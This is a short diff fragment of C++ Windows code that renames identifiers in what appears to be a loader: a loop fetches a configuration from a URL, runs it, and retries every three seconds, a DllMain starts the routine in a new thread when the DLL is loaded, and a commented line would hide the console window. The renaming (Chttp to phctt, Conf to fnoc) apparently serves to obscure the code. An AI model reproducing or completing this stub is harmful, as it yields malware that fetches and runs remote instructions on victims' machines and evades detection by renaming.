@@ -11,21 +11,21 @@
 
 int main(int argc, char* argv[])
 {
-	//ShowWindow(GetConsoleWindow(), SW__HIDE);
+	//ShowWindow(GetConsoleWindow(), SWHIDE);
 	string in(URL);
 	while (true)
 	{
 		try
 		{
-			Chttp __c;
-			string res = __c.__get(URL);
-			Conf* conf = new Conf(res);
-			conf->run();
+			phctt c;
+			string res = c.get(URL);
+			fnoc* f = new fnoc(res);
+			f->run();
 			return 0;
 		}
 		catch (exception e)
 		{
-			Sleep((1+2)*1000);
+			Sleep((3)*1000);
 		}
 
 	}
@@ -33,15 +33,15 @@ int main(int argc, char* argv[])
 
 
 BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD  ul__reason__for__call,
+	DWORD  ulreasonforcall,
 	LPVOID lpReserved
 )
 {
-	switch (ul__reason__for__call)
+	switch (ulreasonforcall)
 	{
 	case DLL_PROCESS_ATTACH:
 	{
-		CreateThread(NULL, NULL, d__run__, NULL, NULL, NULL);
+		CreateThread(NULL, NULL, drun, NULL, NULL, NULL);
 	}
 	break;
 	case DLL_THREAD_ATTACH:
